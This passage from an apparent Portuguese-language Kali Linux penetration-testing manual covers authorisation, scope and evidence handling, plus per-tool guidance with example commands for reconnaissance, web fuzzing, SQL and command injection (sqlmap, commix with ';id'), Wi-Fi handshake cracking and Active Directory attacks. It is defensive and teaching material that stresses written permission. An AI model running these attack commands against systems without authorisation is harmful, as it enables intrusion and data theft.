  3. Graph collection. BloodHound with -c DCOnly first; import and read the shortest paths before touching credentials.
  4. Validate one path. NetExec or Impacket on a single host with the supplied account; stop at a read-only proof.
  5. Only if authorised: Kerberoasting, AS-REP, relay or spraying within the agreed guess budget and lockout window.
  6. Document the chain. Each step, timestamp, host, credential reference and artefact; no screenshots of unrelated data.
  7. Clean up. Remove uploaded files, close sessions, restore changed settings, and report the exact path to the client.

C. Wireless survey and authorised capture

  1. Confirm radio scope and legal basis. Site, channels, clients, times, whether deauth is allowed. If not, passive only.
  2. Hardware check. Monitor mode and injection with your adapter; pass USB through to the VM; record the adapter model.
  3. Passive survey. Kismet or airodump-ng; map SSIDs, BSSIDs, channels, encryption, clients and signal coverage.
  4. Target selection. Choose one authorised BSSID; note WPA2/WPA3, PMF, WPS and client count.
  5. Capture. Lock channel and BSSID, capture a natural handshake; use a minimal deauth only if the scope allows it.
  6. Convert and crack. hcxpcapngtool to hc22000, hashcat -m 22000 with a targeted wordlist; stop when the key is proven.
  7. Report and restore. Stop monitor mode, restore NetworkManager, remove captures you do not need, hash the evidence.

D. Memory and disk triage after an incident

  1. Preserve. Isolate the host, do not reboot, document who touched it and when. Photograph the screen if state matters.
  2. Acquire memory first. Use a trusted acquisition tool, hash the image, record the tool version and time.
  3. Image the disk. Write blocker for physical media; dc3dd/ddrescue for a failing drive; hash source and image.
  4. Work on copies. Volatility for RAM, Autopsy/TSK for disk, binwalk/foremost for firmware or raw data.
  5. Answer questions, not everything. Timeline, persistence, lateral movement, data access. Each conclusion needs an artefact reference.
  6. Package. Evidence tree, hashes, commands, versions, findings. Hand over encrypted and document destruction.

E. Reporting day

  1. Freeze the evidence. Hash the tree, export the tool logs, close sessions and stop listeners.
  2. Deduplicate findings. One root cause, one finding; link affected assets instead of repeating the same paragraph.
  3. Verify every reproduction. A second person should be able to follow the steps without you.
  4. Write the executive summary last. It should reflect the findings, not the effort.
  5. Redact and encrypt. Remove tokens and personal data; encrypt the pack; share through an agreed channel.
  6. Prepare the retest. Define pass/fail criteria before the client starts fixing, so the next round is measurable.

Antes de tocar no teclado

Autorização, âmbito, evidências, condições de paragem

O Kali não torna uma ação legal, e um artigo também não. A diferença entre um teste de intrusão e um crime é um âmbito assinado, uma janela de teste e alguém que possa dizer para parar. Ler esta página antes das páginas das ferramentas; os comandos assumem que esse trabalho já foi feito.

A base legal

O acesso, a interceção e a modificação não autorizados de sistemas ou dados são crime na maioria das jurisdições, incluindo Portugal (Lei do Cibercrime, Lei n.º 109/2009) e o Brasil (Lei n.º 12.737/2012, a Lei Carolina Dieckmann), e dão lugar a ação judicial noutros países. «Só estava a fazer scanning» não é defesa quando o scan não foi autorizado. Isto não é aconselhamento jurídico: o advogado e o cliente definem o contrato.

O blog tem argumentos mais longos sobre porque isto importa: Ethical Hacking, Pentesting Society e Interpretation of Attacks and Security Choices. Quem ainda não os leu fica com a versão curta: capacidade não é permissão, e a segurança do alvo faz parte do trabalho.

O contrato em seis linhas

  1. Partes. Quem está autorizado a testar, em nome de quem, e quem assina.
  2. Ativos. Domínios exatos, gamas de IP, contas na nuvem, aplicações, APIs e contas no âmbito — mais uma lista explícita de exclusões.
  3. Tempo. Início, fim, períodos de bloqueio, limites de taxa e se é permitido trabalhar fora de horas.
  4. Regras. Sem negação de serviço, sem engenharia social, sem exfiltração de dados para além da prova, sem persistência sem consentimento.
  5. Paragem. Um contacto nomeado, um canal fora de banda e as condições que terminam o teste de imediato.
  6. Dados. Onde vivem as evidências, como são cifradas, quem as pode ler, quando são destruídas.

Ensaiar em sistemas que não podem chamar um advogado. Uma rede virtual só-anfitrião com um alvo deliberadamente vulnerável chega para todos os comandos deste manual. O que o Kali não é

  • Não é discreto por omissão. O seu tráfego, user agents, consultas DNS e assinaturas de ferramentas são bem conhecidos. A discrição é uma decisão operacional, não uma funcionalidade da distribuição.
  • Não é um sistema do dia a dia. Uma distribuição rolling de segurança com centenas de pacotes é uma superfície de ataque grande. Usar um sistema diário endurecido e manter o Kali numa VM ou numa máquina dedicada.
  • Não é um servidor. Não expor o Kali como serviço público. Usar Debian ou RHEL para isso.
  • Não é uma coleção de botões mágicos. Cada ferramenta produz evidência que é preciso interpretar. O achado de um scanner é uma hipótese; a confirmação manual é prova.
  • Não é a única opção. Existem Parrot, BlackArch e Debian simples com ferramentas próprias. O Linux distributions field manual explica as famílias.

Disciplina de snapshots

Tirar um snapshot limpo depois da instalação, outro antes de cada apt full-upgrade, e um snapshot por engagement antes de instalar uma ferramenta ou mudar um perfil de rede. As rolling releases quebram pacotes de vez em quando; um snapshot transforma um dia perdido num rollback de cinco minutos.

Três regras que sobrevivem a qualquer ferramenta

  1. Verificar antes de escalar. Um banner de versão não é uma vulnerabilidade. Confirmar com um pedido seguro, uma segunda ferramenta e um passo reprodutível.
  2. Agressividade à medida da permissão. Um formulário de login em produção não é um laboratório. Limites de taxa, políticas de bloqueio e dispositivos frágeis fazem parte do âmbito.
  3. Registar como se o relatório dependesse disso — porque depende. Comando, data, alvo, ficheiro de saída e hash. Se não está no diretório de evidências, não aconteceu.

Reconhecimento e OSINT

Anfitriões, nomes, portas, serviços — e a diferença entre uma pista e um facto

O reconhecimento é onde se ganha o resto do engagement. A recolha passiva usa registos públicos e fontes de terceiros; a ativa envia pacotes ao alvo e pode ser registada, limitada ou reportada. Fazer primeiro a passiva, anotar todas as fontes e nunca deixar que um timeout do scanner se transforme em conclusão.

O reconhecimento também é evidência sobre ti

Consultas DNS, pesquisas em certificate transparency, user agents e origens de scan são visíveis para o alvo e para terceiros. Usar infraestrutura autorizada, não um VPS emprestado, e nunca assumir que o Tor torna um scan ativo anónimo — normalmente torna-o mais lento e mais suspeito.

nmap

pkg: nmap

O que faz. O scanner de portas de referência: descoberta de anfitriões, estados de portas TCP/UDP, deteção de serviços e versões, palpites de OS e o motor de scripts NSE. É a ferramenta para compreender um anfitrião, não apenas para encontrar uma porta aberta.

sudo nmap -sn 10.10.10.0/24 -oA evidence/scans/discovery
sudo nmap -sS -p- --min-rate 1000 -oA evidence/scans/all-tcp 10.10.10.5
sudo nmap -sCV -p 22,80,443 --script safe -oA evidence/scans/services 10.10.10.5
Executar
Primeiro a descoberta ampla, depois todas as portas TCP, depois uma passagem estreita de serviços/scripts. Guardar com -oA; um scan sem saída é um rumor. Usar -Pn quando o ICMP é filtrado, -T2 em ligações frágeis, --reason para ver porque uma porta está marcada como aberta.
Evitar
-T5 em produção ou em ligações WAN, --script vuln como primeiro movimento (ruidoso e por vezes disruptivo), e varrimentos UDP de gamas inteiras. Fechada e filtrada são achados diferentes.
Em vez de
masscan ou rustscan para velocidade; nmap para a verdade. -sT funciona sem sockets em bruto mas usa mais ligações; -sS é a escolha normal quando há root.

masscan

pkg: masscan

O que faz. Um scanner TCP de portas assíncrono, com a sua própria pilha de rede em espaço de utilizador. Troca precisão e profundidade por velocidade bruta em gamas de endereços muito grandes: sem deteção de serviços, sem scripts, sem fingerprinting de OS.

sudo masscan -p1-65535 10.10.10.0/24 --rate=1000 \
  --exclude 10.10.10.1 -oL evidence/scans/masscan.lst
Executar
Apenas em gamas próprias ou autorizadas. Começar em --rate 1000, vigiar a perda de pacotes e depois verificar cada resultado com nmap. Adicionar --wait 3 para que as respostas tardias não se percam.
Evitar
Scans à escala da internet, taxas que saturam um uplink partilhado, e tratar uma falha do masscan como «fechada». A sua pilha pode ser menos fiável que a do kernel, sobretudo atrás de NAT ou de firewalls com estado.
Em vez de
Usá-lo para encontrar candidatos em /16 e /8; entregar cada anfitrião vivo ao nmap. Para um só anfitrião ou um /24, o rustscan é normalmente mais cómodo e o nmap sozinho já é rápido o suficiente.

rustscan

pkg: rustscan

O que faz. Encontra portas TCP abertas com rapidez e entrega-as automaticamente ao nmap para deteção de serviços e scripts. É como uma porta de entrada rápida com o nmap à espera lá dentro.

rustscan -a 10.10.10.5 --ulimit 5000 -- -sV -sC -oA evidence/scans/rustscan
Executar
Tudo o que vem depois de -- é passado ao nmap. Aumentar --ulimit apenas numa máquina controlada. Usar -b para ajustar o tamanho do lote e --scan-order random para reduzir padrões sequenciais óbvios.
Evitar
Assumir que o resultado é mais preciso que o do nmap. É um wrapper de conveniência; a passagem do nmap é a que produz a evidência. Não correr alta concorrência através de uma VPN frágil ou de um caminho com muitos IDS.
Em vez de
Usar rustscan para uma resposta rápida a «que portas estão abertas?» num anfitrião; nmap diretamente quando é precisa temporização cuidadosa ou NSE complexo; masscan para gamas enormes.

arp-scan

pkg: arp-scan

O que faz. Descobre anfitriões no segmento local de camada 2 com pedidos ARP. Como o ARP não é encaminhado, só é autoritativo para a sub-rede em que se está ligado — e encontra muitas vezes dispositivos que ignoram ICMP.

sudo arp-scan -I eth0 --localnet --retry 2
Executar
Usar --localnet ou um CIDR explícito, e confirmar a interface com ip -brief addr. Repetir uma vez para apanhar dispositivos adormecidos. A coluna de fabricante vem do OUI do MAC e é uma pista, não prova.
Evitar
Usá-lo para inferir anfitriões atrás de um router; o ARP não atravessa fronteiras L3. Não confundir um anfitrião silencioso com um ausente — algumas pilhas limitam as respostas ARP.
Em vez de
nmap -sn é melhor para descoberta encaminhada; o arp-scan é melhor para o cabo local e para encontrar aparelhos discretos. Comparar os dois antes de declarar uma sub-rede vazia.

dnsrecon

pkg: dnsrecon

O que faz. Enumera registos e infraestrutura DNS: tipos de registo padrão, tentativas de transferência de zona, registos SRV, cache snooping e brute force de subdomínios por dicionário. É a verificação DNS rápida e programável antes de uma ferramenta de mapeamento mais pesada.

dnsrecon -d example.com -t std --json evidence/recon/dnsrecon.json
dnsrecon -d example.com -t brt \
  -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
Executar
Começar com -t std, depois -t axfr direcionado contra cada servidor de nomes autoritativo. Fazer brute force só com permissão e uma wordlist sensata; usar --threads com moderação para não envenenar o próprio resolver.
Evitar
Tratar um NXDOMAIN como prova de que um nome não existe (existem wildcards e DNS split-horizon), e fazer brute force de um domínio de terceiros só porque apareceu num certificado.
Em vez de
O dnsenum acrescenta scraping e whois; o fierce é mais leve e foca-se em espaço de IP não contíguo; o amass é a ferramenta de mapeamento profundo. O dnsrecon é a primeira passagem rápida.

dnsenum

pkg: dnsenum

O que faz. Um script de enumeração DNS da era Perl: consultas de registos, tentativas de transferência de zona, brute force de subdomínios, reverse lookups e scraping opcional de motores de busca. Continua útil porque a saída é compacta e a rotina de transferência de zona é direta.

dnsenum --enum example.com \
  -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r
Executar
Usar --enum como atalho e -r para brute force recursivo. Guardar a saída do terminal; a saída em ficheiro do dnsenum é menos estruturada que o JSON do dnsrecon.
Evitar
Contar com o scraping do Google — os fornecedores de pesquisa bloqueiam ou mudam formatos constantemente. Não correr recursão sem limite de tempo; expande-se depressa.
Em vez de
Preferir o dnsrecon para JSON limpo e tipos de registo atuais, ou o amass para um mapa sério. Manter o dnsenum para uma segunda opinião rápida ou para ambientes onde já está instalado.

fierce

pkg: fierce

O que faz. Uma ferramenta de reconhecimento DNS focada em encontrar anfitriões em espaço de IP não contíguo: resolve nomes, testa transferências de zona, deteta wildcards e faz brute force de subdomínios num fluxo pequeno e rápido.

fierce --domain example.com \
  --subdomains /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
Executar
Ler o aviso de wildcard: se todos os nomes aleatórios resolvem, os resultados de brute force não valem nada até o endereço wildcard ser filtrado. Manter os timeouts por omissão para DNS público e aumentá-los só em laboratório.
Evitar
Usá-lo como ferramenta de ataque — é um resolver e um mapeador. Não encontra nomes que só existem em DNS interno, nem vê anfitriões que nunca aparecem no DNS.
Em vez de
Mais rápido de escrever que o amass e mais limpo que o dnsenum para um único domínio. Escolher o amass quando são precisos certificados, ASNs, fontes de API e um grafo; escolher o fierce para uma resposta em cinco minutos.

whois

pkg: whois

O que faz. Consulta o sistema de registo de um domínio, IP ou ASN: registrar, datas de criação e expiração, servidores de nomes, organização registante (quando não ocultada) e contactos de abuso. O RDAP é o sucessor moderno em JSON.

whois example.com
whois -h whois.iana.org example.com
curl -s https://rdap.org/domain/example.com | jq '.events, .nameservers'
Executar
Consultar o registo autoritativo do TLD e depois o registrar. Registar a data de obtenção; os dados de registo envelhecem. Usar RDAP quando é precisa saída legível por máquina.
Evitar
Confiar em campos ocultados ou assumir que o registante é o operador. Serviços de privacidade, revendedores e subsidiárias escondem rotineiramente o dono real. Não usar dados de whois para engenharia social fora do âmbito.
Em vez de
O DNS diz o que resolve agora; o whois diz quem o registou e quando. Respondem a perguntas diferentes e muitas vezes discordam.

theHarvester

pkg: theharvester

O que faz. Recolhe emails públicos, hostnames, nomes de colaboradores e URLs a partir de motores de busca, certificate transparency e outras fontes. É OSINT de contactos e de superfície, não um scanner de portas.

theHarvester -d example.com -b duckduckgo,bing,crtsh -l 300 \
  -f evidence/recon/harvester
Executar
Usar crtsh para hostnames do histórico de certificados, e adicionar chaves de API em /etc/theHarvester/api-keys.yaml para fontes pagas ou com limite de pedidos. Manter -l modesto e guardar o relatório HTML/JSON.
Evitar
Assumir que um email pertence a um colaborador atual, ou que um hostname ainda resolve. Verificar antes de usar. Respeitar os termos dos fornecedores e a lei anti-spam; endereços recolhidos não são uma lista de correio.
Em vez de
O amass mapeia infraestrutura; o theHarvester encontra pessoas e pontos de contacto; o SpiderFoot automatiza os dois com correlação. Usar o mais leve que responde à pergunta.

amass

pkg: amass

O que faz. Mapeia a superfície de ataque externa de uma organização: subdomínios, IPs, ASNs, nomes em certificados e relações. O modo passivo usa fontes públicas; o ativo acrescenta resolução DNS, brute force e zone walking.

amass enum -passive -d example.com -o evidence/recon/amass-passive.txt
amass enum -active -d example.com -brute -w wordlist.txt \
  -o evidence/recon/amass-active.txt
Executar
Passivo primeiro, sempre. Configurar chaves de API em ~/.config/amass/config.yaml para melhor cobertura, definir -timeout, e guardar a saída JSON para o grafo. Ler o log: o amass indica que fontes falharam.
Evitar
Lançar -active contra o DNS de produção de um cliente sem aviso — é ruidoso. Não assumir que o resultado está completo; DNS privado, split horizon e CDNs escondem propriedades inteiras.
Em vez de
Usar o amass quando o âmbito é uma organização inteira e são precisas relações; dnsrecon/fierce para uma verificação rápida de domínio; theHarvester quando a pergunta é sobre pessoas, não infraestrutura.

recon-ng

pkg: recon-ng

O que faz. Um framework OSINT modular com workspaces, uma base de dados e importação/exportação. Carregam-se módulos, define-se uma fonte, correm-se, e os resultados persistem para que módulos posteriores consumam achados anteriores.

recon-ng
[recon-ng][default] > workspaces create client
[recon-ng][client] > marketplace search
[recon-ng][client] > modules load recon/domains-hosts/hackertarget
[recon-ng][client] > options set SOURCE example.com
[recon-ng][client] > run
[recon-ng][client] > show hosts
Executar
Um workspace por cliente ou engagement. Instalar só os módulos necessários; marketplace install puxa de um índice remoto. Adicionar chaves de API com keys add, depois exportar com os módulos de relatório.
Evitar
Assumir que os módulos ainda funcionam — os sites de origem mudam e quebram-nos constantemente. Não misturar clientes num workspace; a base de dados passa a ser evidência e risco de confidencialidade.
Em vez de
O SpiderFoot é mais automático e visual; o recon-ng dá um pipeline deliberado, conduzido pelo analista, com uma base de dados consultável. Escolher consoante se quer um fluxo de trabalho ou um scan.

SpiderFoot

pkg: spiderfoot

O que faz. Automatiza a recolha OSINT com mais de 200 módulos e correlaciona os resultados num grafo de domínios, IPs, pessoas, fugas de dados e tecnologias. Pode correr a partir de uma UI web local ou da linha de comando.

spiderfoot -l 127.0.0.1:5001
# then open http://127.0.0.1:5001 and add the target as a new scan
Executar
Ligar a 127.0.0.1 a menos que se tenha adicionado autenticação e TLS. Começar com um perfil de scan «passivo», ativar só módulos cujos termos se aceitam, e contar com uma execução longa.
Evitar
Expor a UI web à internet; não tem autenticação significativa por omissão. Não ativar módulos intrusivos contra um alvo sem permissão escrita.
Em vez de
O SpiderFoot é amplitude e correlação; o recon-ng é um pipeline controlado; o theHarvester é uma só pergunta. Usar o SpiderFoot quando é preciso o grafo, não quando é precisa uma resposta.

whatweb

pkg: whatweb

O que faz. Faz fingerprint de stacks web: servidor, CMS, frameworks, bibliotecas JavaScript, analytics, cookies e pistas de versão. Transforma um URL num perfil tecnológico curto que diz que testes vale a pena correr.

whatweb -a 3 -v https://example.com
Executar
Agressividade 1 é educada, 3 é um bom padrão, 4 é barulhenta. Usar --user-agent para se identificar com honestidade, e corroborar a stack com cabeçalhos e código-fonte.
Evitar
Reportar «WordPress 6.x» como vulnerabilidade sem a versão exata e um advisory correspondente. Os fingerprints podem ser falsificados, estar em cache ou ser herdados de um CDN.
Em vez de
O wafw00f responde a «há um WAF à frente?»; o nikto verifica má configuração do servidor; o whatweb responde a «com o que isto é construído?». Começar aqui e depois escolher o especialista.

wafw00f

pkg: wafw00f

O que faz. Deteta e identifica firewalls de aplicação web enviando pedidos cuidadosamente escolhidos e comparando respostas. Diz se existe um WAF e muitas vezes qual o produto, não como o contornar.

wafw00f -a https://example.com
Executar
Testar o hostname e o esquema exatos no âmbito; um WAF no apex não implica um no subdomínio de API. Repetir depois de um bloqueio para ver se a resposta mudou.
Evitar
Tratar «nenhum WAF detetado» como permissão para martelar o alvo. Limites de taxa, CDNs e filtros personalizados podem não ser identificáveis. Detetar não é autorização para evadir.
Em vez de
O whatweb identifica a aplicação; o wafw00f identifica a defesa à frente dela. Correr os dois e depois ajustar taxa e profundidade — não a ética.

A condição de saída do reconhecimento

Parar quando uma fonte nova deixa de produzir ativos novos, não quando uma ferramenta termina. Escrever uma linha por ativo com fonte, primeira observação, endereço resolvido e confiança. Essa tabela torna-se o mapa de âmbito da fase seguinte — e a prova de que se ficou dentro dele.

Teste de aplicações web

Proxy, crawl, fuzz, confirmar — por essa ordem

O teste web é sobretudo um exercício de cartografia. Um proxy mostra o que o browser envia realmente; a descoberta de conteúdo encontra o que o site não liga; os scanners comparam o que foi encontrado com padrões conhecidos; as ferramentas de exploração provam uma hipótese específica. Saltar o mapa é como as pessoas «encontram» a mesma página 404 quarenta vezes e lhe chamam vulnerabilidade.

Produção não é laboratório

Testes destrutivos (DELETE, checkout, reposição de palavra-passe, upload de ficheiros, injeção de comandos) exigem permissão explícita e um plano de rollback. Preferir uma cópia de staging com dados semelhantes aos de produção. Quando só existe produção, testar com o pedido menos invasivo que prova o problema e parar aí.

O ciclo de teste web

  1. Configurar um perfil de browser que confia na CA de interceção e em mais nada. Nunca usar o browser do dia a dia para testes.
  2. Percorrer e clicar na aplicação com o proxy a gravar. Autenticação, perfis e mudanças de estado importam mais que a página raiz.
  3. Mapear entradas: parâmetros, corpos JSON, cabeçalhos, cookies, nomes de ficheiros, operações GraphQL, mensagens WebSocket.
  4. Fuzz com estreiteza com uma wordlist calibrada e limite de taxa. Comparar comprimento, estado, palavras e tempo de resposta.
  5. Confirmar manualmente no Repeater ou com curl, e depois capturar o menor pedido que prova o impacto.

Burp Suite

pkg: burpsuite

O que faz. Um proxy HTTP(S) de interceção com o kit de teste manual à volta: Repeater para editar e reenviar pedidos, Intruder para ataques estruturados, Decoder/Comparer para payloads e diffs, e um ecossistema grande de extensões. A edição Community é gratuita; a Pro acrescenta o scanner e a gravação de projetos.

burpsuite
# Proxy listener: 127.0.0.1:8080
# Browser profile proxy: 127.0.0.1:8080, then import Burp's CA certificate
Executar
Definir um âmbito de alvo e ativar «Show only in-scope items» antes de navegar. Intercetar só enquanto for preciso editar; caso contrário deixar o tráfego passar. Usar o Repeater para cada achado e guardar o pedido/resposta exato como evidência.
Evitar
Deixar o Intruder Community a correr listas grandes — é deliberadamente limitado e parece um DoS. Não instalar extensões BApp aleatórias num engagement de cliente sem as rever.
Em vez de
O ZAP é a alternativa gratuita e automatizada; o mitmproxy é a alternativa CLI programável. O Burp ganha na ergonomia manual e nas extensões, não por ser o único proxy.

OWASP ZAP

pkg: zaproxy

O que faz. Um proxy de interceção e scanner web totalmente open source. O scanning passivo analisa o tráfego gerado; o ativo envia payloads de ataque contra pedidos no âmbito. Tem também um framework de automação poderoso e um modo daemon sem interface.

zaproxy
# or run the daemon locally for automation:
zaproxy -daemon -host 127.0.0.1 -port 8090
Executar
Primeiro o scan passivo e ler os alertas; são pistas, não veredictos. Para o scan ativo, definir um contexto, incluir só URLs no âmbito e excluir endpoints de logout/destrutivos. Limitar threads e pedidos por segundo em produção.
Evitar
Correr o scanner ativo com a força padrão contra um site em produção sem aviso. Não deixar a chave da API desativada numa interface que não seja loopback; isso é uma porta de controlo remoto aberta.
Em vez de
O ZAP é a melhor escolha gratuita quando é preciso scanning e automação integrados; o Burp Community é mais forte para trabalho manual. Usar um proxy de cada vez para evitar confusão de certificados e de tráfego.

ffuf

pkg: ffuf

O que faz. Um fuzzer web genérico e rápido. FUZZ pode substituir um segmento de caminho, um valor de parâmetro, um valor de cabeçalho, um hostname ou um campo de corpo POST. Os filtros permitem descartar o ruído para que as respostas interessantes se destaquem.

ffuf -u https://example.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -fc 404 -t 20 -rate 40 -of json -o evidence/web/ffuf-dirs.json

ffuf -u https://example.com/ -H "Host: FUZZ.example.com" \
  -w subdomains.txt -fs 4242 -t 20 -rate 40
Executar
Calibrar primeiro: pedir um caminho aleatório e anotar tamanho/palavras/linhas, depois filtrar com -fs, -fw ou -fl. -ac automatiza a calibração. Começar com 20 threads e 40 pedidos/s; aumentar só depois de observar a taxa de erros.
Evitar
Bater num endpoint de login ou de pesquisa com milhares de pedidos e sem limite de taxa. Não confiar num resultado até o obter manualmente; soft-404s e rotas catch-all produzem falsos positivos bonitos.
Em vez de
O ffuf é o fuzzer genérico mais flexível; o gobuster é mais simples para os modos padrão de diretórios/DNS; o feroxbuster é melhor para descoberta recursiva profunda; o wfuzz é orientado a payloads.

gobuster

pkg: gobuster

O que faz. Um brute-forcer focado com modos separados: dir para caminhos e ficheiros, dns para subdomínios, vhost para virtual hosts, e modos de armazenamento na nuvem. É mais simples que um fuzzer genérico e a saída lê-se bem.

gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt -t 20 --exclude-length 1234 -o evidence/web/gobuster.txt

gobuster dns -d example.com -w subdomains.txt --show-ips
Executar
Usar --exclude-length para remover o soft-404 do site. Acrescentar extensões que correspondam à stack identificada. Para vhosts, usar --append-domain e comparar com a resposta padrão.
Evitar
-k (ignorar a verificação TLS) fora de um laboratório; esconde problemas de certificado e cria maus hábitos. Não assumir que 403 significa «não há nada» — pode ser um recurso protegido que vale a pena reportar.
Em vez de
Escolher o gobuster para uma passagem rápida com wordlist padrão; ffuf para filtros e posições de pedido arbitrárias; feroxbuster quando a recursão e a extração de links importam.

feroxbuster

pkg: feroxbuster

O que faz. Uma ferramenta rápida de descoberta recursiva de conteúdo, escrita em Rust. Segue automaticamente os diretórios descobertos, extrai links das respostas, filtra o ruído de wildcards e mantém uma saída limpa por alvo.

feroxbuster -u https://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html -t 50 --rate-limit 50 --filter-status 404,403 \
  -o evidence/web/feroxbuster.txt
Executar
A recursão está ligada por omissão; definir --depth para a manter limitada. Usar --smart para parar em ramos com muitos wildcards, e --extract-links para encontrar caminhos que a wordlist nunca continha.
Evitar
Deixar a recursão explodir num calendário ou num site de comércio eletrónico com milhões de URLs sintéticos. Vigiar a taxa de pedidos e cortar ramos que só devolvem a mesma página.
Em vez de
O feroxbuster é o melhor padrão para descoberta de conteúdo em profundidade; ffuf para fuzzing preciso; gobuster para uma passagem única previsível; dirb para ambientes legacy.

dirb

pkg: dirb

O que faz. O brute-forcer de diretórios clássico. Percorre uma wordlist, entra recursivamente nos diretórios descobertos e imprime um relatório simples. É antigo, single-threaded e ruidoso, mas continua útil para uma verificação rápida ou num ambiente onde nada mais recente está instalado.

dirb https://example.com /usr/share/wordlists/dirb/common.txt \
  -S -r -o evidence/web/dirb.txt
Executar
-S silencia o banner, -r desativa a recursão, e -o guarda o resultado. Usar uma wordlist específica do site quando existir; common.txt é um mínimo, não uma estratégia.
Evitar
Usá-lo em engagements grandes: sem ajuste de concorrência, sem filtros modernos, e vai ser lento. Não deixar a recursão correr sem supervisão.
Em vez de
Recorrer ao ffuf, gobuster ou feroxbuster. Manter o dirb para uma verificação de compatibilidade ou para ensinar o que um brute-forcer faz realmente.

wfuzz

pkg: wfuzz

O que faz. Um fuzzer Python construído à volta de payloads, encoders e iteradores. Pode combinar várias wordlists, encadear encoders (URL, base64, hex) e filtrar respostas por estado, tamanho, contagem de palavras ou regex. É mais lento que as ferramentas em Rust/Go mas muito expressivo.

wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt \
  --hc 404 --hh 1234 -t 20 https://example.com/FUZZ
Executar
Usar --hc para estado, --hh para contagem de caracteres, -z para fontes de payloads. Imprimir o payload com -v e guardar com -f evidence/web/wfuzz.csv,csv.
Evitar
Produtos de várias wordlists que fazem explodir a contagem de pedidos. Calcular list A × list B antes de correr; é fácil transformar um fuzzer num teste de carga.
Em vez de
O wfuzz é para ginástica de payloads; o ffuf é mais rápido para o mesmo trabalho; o gobuster é mais simples. Usar o wfuzz quando os encoders e os payloads encadeados são o objetivo.

nikto

pkg: nikto

O que faz. Verifica um servidor web contra milhares de problemas conhecidos: ficheiros perigosos, componentes desatualizados, cabeçalhos em falta, caminhos administrativos expostos e conteúdo por omissão. É um scanner de configuração de servidor, não um testador de lógica de aplicação.

nikto -h https://example.com -ssl -Tuning 123b \
  -o evidence/web/nikto.html -Format html
Executar
Usar -Tuning para manter o conjunto de verificações relevante, e rever cada referência «OSVDB» ou CVE contra a versão real. Combinar com um proxy (-useproxy) se for preciso ver os pedidos em bruto.
Evitar
Correr às escondidas e esperar silêncio: o seu user agent e o padrão de pedidos são famosos. Não reportar cada cabeçalho informativo como vulnerabilidade.
Em vez de
O nuclei é baseado em templates e mais preciso para CVEs conhecidos; o nikto é mais amplo e ruidoso para higiene de servidor. Correr o nikto para uma linha de base rápida e depois verificar com pedidos manuais.

sqlmap

pkg: sqlmap

O que faz. Deteta e explora injeção SQL: blind booleana/temporal, baseada em erros, UNION, consultas empilhadas e canais fora de banda. Pode enumerar bases de dados, tabelas e dados e, opcionalmente, obter execução de comandos através da base de dados.

sqlmap -r evidence/web/login.request -p username --batch \
  --level=2 --risk=1 --technique=BEU --threads=4 \
  --dbs --output-dir=evidence/web/sqlmap
Executar
Guardar o pedido exato do Burp/ZAP e usar -r; preserva cookies, cabeçalhos e método. Começar com --level 2 --risk 1, apontar a um parâmetro e extrair apenas os dados mínimos necessários para provar o impacto.
Evitar
--risk 3 em produção (pode modificar ou apagar dados), --os-shell sem âmbito explícito, e extração ilimitada de dados pessoais. --flush-session destrói a própria cadeia de evidências.
Em vez de
Primeiro Repeater/curl manual para confirmar a injeção; sqlmap para automatizar a prova. O commix é o equivalente para injeção de comandos; o nuclei pode detetar um CVE de SQLi conhecido mas não substitui a lógica de exploração.

WPScan

pkg: wpscan

O que faz. Enumera instalações WordPress: versão, plugins, temas, utilizadores e vulnerabilidades conhecidas. É a ferramenta especialista para um CMS que sustenta uma fatia enorme da web, e depende de uma base de dados externa de vulnerabilidades para resultados com sentido.

wpscan --url https://example.com --enumerate vp,vt,u \
  --plugins-detection mixed --random-user-agent --max-threads 5 \
  --api-token "$WPSCAN_TOKEN" -o evidence/web/wpscan.json -f json
Executar
Obter um token de API gratuito e exportá-lo como variável de ambiente, não no histórico da shell. Enumerar plugins vulneráveis (vp), temas vulneráveis (vt) e utilizadores (u) por essa ordem. Confirmar cada versão antes de reportar.
Evitar
Fazer brute force de palavras-passe pelo WPScan sem conhecer a política de bloqueio. Não tratar a enumeração de utilizadores como crítica por si só; é um passo, não o impacto.
Em vez de
O whatweb diz que é WordPress; o WPScan diz que partes estão velhas; o nuclei pode verificar CVEs específicos; o sqlmap trata de uma injeção se ela for encontrada. Adequar a ferramenta à camada.

commix

pkg: commix

O que faz. Deteta e explora injeção de comandos do sistema em parâmetros web, cabeçalhos e corpos de pedidos. Suporta resultados clássicos, injeção blind baseada em tempo e exfiltração fora de banda, e pode abrir uma pseudo-shell interativa.

commix --url="https://example.com/ping.php?ip=127.0.0.1" \
  --batch --level=2 --output-dir=evidence/web/commix
Executar
Confirmar primeiro manualmente com um separador inofensivo e um comando benigno como ;id ou |whoami. Depois deixar o commix automatizar a prova. Manter os comandos só de leitura e registar tudo.
Evitar
Correr comandos destrutivos, reverse shells para anfitriões não aprovados, ou --os-shell num sistema em produção sem permissão escrita e um plano de limpeza.
Em vez de
O sqlmap é para injeção SQL; o commix é para metacaracteres de shell que chegam ao sistema. Bug diferente, ferramenta diferente. O nuclei pode sinalizar um CVE de injeção de comandos conhecido, mas a exploração continua a precisar de verificação.

nuclei

pkg: nuclei

O que faz. Corre uma biblioteca grande de templates YAML mantida pela comunidade contra os alvos. Cada template descreve um pedido, um matcher e muitas vezes um CVE ou uma má configuração. É triagem e verificação rápidas para padrões conhecidos — não um testador de lógica nem um fuzzer.

nuclei -u https://example.com -severity critical,high \
  -rl 50 -c 25 -stats -o evidence/web/nuclei.txt
Executar
Atualizar os templates de forma controlada, ler o template antes de confiar no resultado e confirmar cada acerto com um pedido manual. Começar com filtros de severidade e concorrência baixa; -rl é pedidos por segundo por template.
Evitar
Apontá-lo a todo o espaço de IP de um cliente sem âmbito. Os templates da comunidade podem estar errados ou ser demasiado amplos; um resultado «crítico» que não se consegue reproduzir não é um achado.
Em vez de
O nikto é mais antigo e mais amplo; o nuclei é orientado a templates e mais fácil de auditar. Nenhum substitui uma pessoa a testar a lógica de negócio de uma aplicação.

05

Palavras-passe e credenciais

Adivinhar online, quebrar offline, e o bloqueio que não se leu

